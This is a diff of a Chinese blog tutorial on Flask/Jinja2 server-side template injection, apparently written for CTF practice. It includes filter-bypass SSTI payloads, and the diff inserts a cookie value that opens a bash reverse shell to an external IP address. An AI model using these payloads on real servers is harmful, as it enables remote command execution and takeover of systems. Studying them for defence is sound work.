@@ -1,291 +1,159 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="阿巴">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    
-    
-    <!--- Seo Part-->
-    
-    <link rel="canonical" href="http://example.com/2023/08/09/ssti模板注入/"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
-    
-        <meta name="description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssti模板注入 | 阿巴</title><meta name="author" content="阿巴"><meta name="copyright" content="阿巴"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssti模板注入">
 <meta property="og:url" content="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="阿巴">
 <meta property="og:description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png">
-<meta property="og:image" content="http://example.com/source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png">
-<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:published_time" content="2023-08-09T11:46:00.000Z">
-<meta property="article:modified_time" content="2023-09-27T10:11:45.030Z">
+<meta property="article:modified_time" content="2024-07-14T07:43:12.328Z">
 <meta property="article:author" content="阿巴">
 <meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ssti模板注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-14 15:43:12'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-    
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/8d.png@1256w_1256h_!web-article-pic.webp" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
-    <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
-    <!--- Page Info-->
-    
-    <title>
-        
-            ssti模板注入 -
-        
-        阿巴
-    </title>
-    
-<link rel="stylesheet" href="/css/style.css">
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-    
-<link rel="stylesheet" href="/fonts/fonts.css">
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
+        document.head.appendChild(script)
+      })
     
-<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
-
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
-
-    <!--- Font Part-->
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    
-    
-
-    <!--- Inject Part-->
-    
-    <script id="hexo-configurations">
-    let Global = window.Global || {};
-    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
-    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/e6d1c777bb54674dd5cc6ed2c6147596a899ed7b.jpg@1256w_708h_!web-article-pic.webp","dark":"/images/688bff5fab134b2da7d52ca53163372d39812ec8.jpg@1256w_708h_!web-article-pic.webp"},"title":"阿巴的小站","subtitle":{"text":[],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/621779","instagram":"https://www.instagram.com/","zhihu":"https://www.zhihu.com/people/zhi-chu-85-7","twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"如果讨厌当前的处境，那就不惜一切代价上去，然后去追随梦想吧！","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/11  12：00：00"};
-    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
-    Global.data_config = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/regular.min.css">
-
-    
-    
-    
-    
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-<div class="progress-bar-container">
-    
-
-    
-        <span class="pjax-progress-bar"></span>
-        <span class="pjax-progress-icon">
-            <i class="fa-solid fa-circle-notch fa-spin"></i>
-        </span>
-    
-</div>
-
-
-<main class="page-container">
-
-    
-
-    <div class="main-content-container">
-
-        <div class="main-content-header">
-            <header class="navbar-container">
-    
-    <div class="navbar-content">
-        <div class="left">
-            
-            <a class="logo-title" href="/">
-                
-                阿巴
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="" 
-                                    href="/"  >
-                                    
-                                        
-                                            <i class="fa-regular fa-house"></i>
-                                        
-                                        HOME
-                                    
-                                </a>
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mobile drawer -->
-    <div class="navbar-drawer">
-        <ul class="drawer-navbar-list">
-            
-                
-                    <li class="drawer-navbar-item flex-center">
-                        <a class="" 
-                        href="/"  >
-                             
-                                
-                                    <i class="fa-regular fa-house"></i>
-                                
-                                HOME
-                            
-                        </a>
-                    </li>
-                    <!-- Submenu -->
-                    
-            
-
-        </ul>
-    </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-        </div>
-
-        <div class="main-content-body">
-
-            
-
-            <div class="main-content">
-
-                
-                    <div class="fade-in-down-animation">
-    <div class="post-page-container">
-        <div class="article-content-container">
-
-            <div class="article-title">
-                
-                  <h1 class="article-title-regular">ssti模板注入</h1>
-                
-              </div>
-              
-                     
-            
-            
-                <div class="article-header">
-                    <div class="avatar">
-                        <img src="/images/49871906.jpg">
-                    </div>
-                    <div class="info">
-                        <div class="author">
-                            <span class="name">阿巴</span>
-                            
-                                <span class="author-label">Lv4</span>
-                            
-                        </div>
-                        <div class="meta-info">
-                            <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-08-09 19:46</span>
-        <span class="mobile">2023-08-09 19:46</span>
-        <span class="hover-info">Created</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-09-27 18:11:45</span>
-            <span class="mobile">2023-09-27 18:11:45</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
-
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
-
-                        </div>
-                    </div>
-                </div>
-            
-
-            <div class="article-content markdown-body">
-                <span id="more"></span>
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="阿巴"><span class="site-name">阿巴</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ssti模板注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-09T11:46:00.000Z" title="Created 2023-08-09 19:46:00">2023-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-14T07:43:12.328Z" title="Updated 2024-07-14 15:43:12">2024-07-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ssti模板注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
 
 <h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h2 id="flask基本介绍"><a href="#flask基本介绍" class="headerlink" title="flask基本介绍"></a>flask基本介绍</h2><p>flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。</p>
 <p>Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。</p>
@@ -318,32 +186,17 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 
 <p><strong>方法</strong></p>
 <p>在flask中常见方法如下：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png"></p>
 <p>用法实例如下图：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png"></p>
 <h2 id="flask模板介绍"><a href="#flask模板介绍" class="headerlink" title="flask模板介绍"></a>flask模板介绍</h2><p>视图函数：一个处理http请求的函数，视图函数通过装饰器将其与一个特定的URL绑定起来，当用户访问该URL时，Flask会调用相应的视图函数来处理请求。</p>
 <p>flask模板：lask模板是一种用于在Web应用程序中生成动态HTML内容的技术。它允许你将静态HTML文件与动态数据进行结合，以便根据不同的输入和条件生成不同的输出。</p>
 <p>两者在flask中的作用：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png"></p>
 <h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>常见的题解：</p>
 <pre class="line-numbers language-none"><code class="language-none">过滤中括号，单双引号，下滑线：
 &#123;&#123;()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)()&#125;&#125;
-cookies：a&#x3D;__class__; b&#x3D;__base__; c&#x3D;__subclasses__; d&#x3D;__getitem__; e&#x3D;__init__; f&#x3D;__globals__; g&#x3D;__getitem__; h&#x3D;os; i&#x3D;popen; j&#x3D;cat &#x2F;flag; k&#x3D;read
+cookies：a&#x3D;__class__; b&#x3D;__base__; c&#x3D;__subclasses__; d&#x3D;__getitem__; e&#x3D;__init__; f&#x3D;__globals__; g&#x3D;__getitem__; h&#x3D;os; i&#x3D;popen; j&#x3D;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;120.46.183.140&#x2F;8888 0&gt;&amp;1&quot;; k&#x3D;read
 
 在上面的基础上再过滤双重大括号：
 &#123;%print(()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)())%&#125;
@@ -365,27 +218,12 @@ aoafbo.dnslog.cn
 <h3 id="flask漏洞"><a href="#flask漏洞" class="headerlink" title="flask漏洞"></a>flask漏洞</h3><p><strong>漏洞成因</strong>：在模板渲染时没有对用户的输入进行严格的过滤，或使用了危险的模板，导致用户和flask程序可以交互，导致出现漏洞。漏洞会导致任意文件读取，和命令执行</p>
 <p>漏洞展示：</p>
 <p>正常代码：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png"></p>
 <p>漏洞代码：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png"></p>
 <p>上面两端代码，第一张是先解析在放入模板中，第二张是先到模板中，在解析，再进行显示，这种情况，如果没有过滤，就会导致注入现象发生。</p>
 <h3 id="漏洞的判断"><a href="#漏洞的判断" class="headerlink" title="漏洞的判断"></a>漏洞的判断</h3><p>通过下图可以逐步判断漏洞的模板类型</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png"
-                     
-                ></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png"></p>
 <p>红色是未响应，如${7*7}无响应就是显示原值，有响应会返回49，绿色是有响应，通过这个逻辑我们可以判断是那个一种模板</p>
 <h3 id="继承关系和魔术方法"><a href="#继承关系和魔术方法" class="headerlink" title="继承关系和魔术方法"></a>继承关系和魔术方法</h3><h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>一下面的一段代码为例：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
@@ -402,12 +240,7 @@ c <span class="token operator">=</span> C <span class="token punctuation">(</spa
 <span class="token comment">#(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以看到运行到最后显示A的父类是object，故可得，他是所有父子关系的顶层。其他的关系见下图：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../../source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png"
-                     
-                ></p>
+<p><img src="/../../source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png"></p>
 <p><strong>魔术方法</strong></p>
 <p><code>class</code>：查找当前类型的所属对象</p>
 <p><code>base</code>：沿着父子类的关系往上走一个</p>
@@ -504,28 +337,13 @@ default(value,default_value,boolean&#x3D;false)：如果当前变量没有值，
 length() 	返回字符串的长度，别名是count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="常用注入模块详解"><a href="#常用注入模块详解" class="headerlink" title="常用注入模块详解"></a>常用注入模块详解</h4><p>可用的注入模块：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png"
-                     
-                ></p>
